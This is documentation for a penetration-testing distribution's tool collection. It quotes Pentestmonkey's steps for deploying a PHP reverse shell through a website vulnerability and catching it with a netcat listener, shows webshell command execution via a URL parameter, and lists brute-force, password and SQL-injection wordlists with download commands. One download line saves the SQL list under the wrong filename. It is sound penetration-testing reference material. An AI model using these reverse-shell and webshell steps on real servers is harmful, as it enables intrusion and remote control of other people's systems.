<!-- INFO {{{

# [/ael/data/documentation/collection.md]
# author        : Pascal Malouin (https://github.com/alterEGO-Linux)
# created       : 2026-04-16 15:56:01 UTC
# updated       : 2026-04-20 17:43:05 UTC
# description   : Collection documentation.
# tags          : #reverse shell #wordlist

}}} -->

# Collection

## Reverse Shells

### PenTestMonkey - php-reverse-shell.php

ref. <https://pentestmonkey.net/tools/web-shells/php-reverse-shell>

Instructions from Pentestmonkey.

```text
Modify the source

To prevent someone else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:

$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS

Get Ready to catch the reverse shell

Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):

$ nc -v -n -l -p 1234

Upload and Run the script

Using whatever vulnerability you’ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won’t see any output on the web page, it’ll just hang if successful):

http://somesite/php-reverse-shell.php

Enjoy your new shell

If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:

$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$
```

### /collection/reverse-shells/webshell.php

ref. <https://github.com/ertaku12/one-liner-webshells>

This PHP webshell will, if the web server has PHP enable, display the stdout of the command.

For example, the following will return the username.

```url
http://127.0.0.1:8000/webshell.php?cmd=whoami
```

It must first be transferred to the server.

TEST (if you are using the alterEGO Linux system):
- Go to ~/.ael/collection/reverse-shells/.
- Start a php server:

```php
php -S 127.0.0.1:8000
```

- In your web browser, enter <http://127.0.0.1:8000/webshell.php?cmd=ls>.

You should see the directory listing.

This also works with TUI web browser.

```shell
lynx http://127.0.0.1:8000/webshell.php?cmd=ls
```

## Wordlists

### best1050.txt

Curated list of 1049 words designed for fast and standard web directory/file brute-forcing.

The origin of best1050.txt is not clear, but was an early addition to DIRB CLI-based brute forcing tool. Thus, when DIRB is installed, the list can be found at `/usr/share/dirb/wordlists/others/best1050.txt`.

It used to be available on SecLists GitHub, but was removed.

Version used by alterEGO Linux is from DIRB.

### big.txt

Curated medium size (according to modern standard) directories and files common names.

This list is part of the DIRB wordlist's buddle.

Version used by alterEGO Linux is from DIRB ('/usr/share/dirb/wordlists/big.txt').

### directory-list-2.3-medium.txt

Part of the OWASP DirBuster Project, lead by James Fisher aimed at web directory/file discovery.

Version used by alterEGO Linux is from Dirbuster ('/usr/share/dirbuster/directory-list-2.3-medium.txt').

### raft-large-files.txt

Part of the RAFT (Response Analysis and Further Testing Tool) project <https://code.google.com/archive/p/raft/>.

Version used by alterEGO Linux is from SecLists.

```shell
curl https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/raft-large-words.txt -o $AEL_FILES/collection/wordlists/raft-large-files.txt
```

### Rockyou.txt

The rockyou.txt file is one of the most well-known password datasets in cybersecurity history. It originates from a 2009 data breach of the company RockYou, where millions of user passwords were exposed due to poor security practices—specifically, storing passwords in plain text. Containing over 14 million real-world passwords, rockyou.txt has since become a widely used resource for security research, password strength analysis, and penetration testing. Its significance lies in revealing common human tendencies in password creation, highlighting patterns such as simple words, names, and predictable number combinations, which continue to inform modern approaches to authentication and cybersecurity defense.

Version sourced from Kali Linux.

```shell
curl https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz -o $AEL_FILES/collection/wordlists/rockyou.txt.gz
```

### xplatform.txt

SQL injection list.

Version used by alterEGO Linux is from Fuzzdb-project.

```shell
curl https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/refs/heads/master/attack/sql-injection/detect/xplatform.txt -o $AEL_FILES/collection/wordlists/raft-large-files.txt
```

<!--
# vim: foldmethod=marker
-->
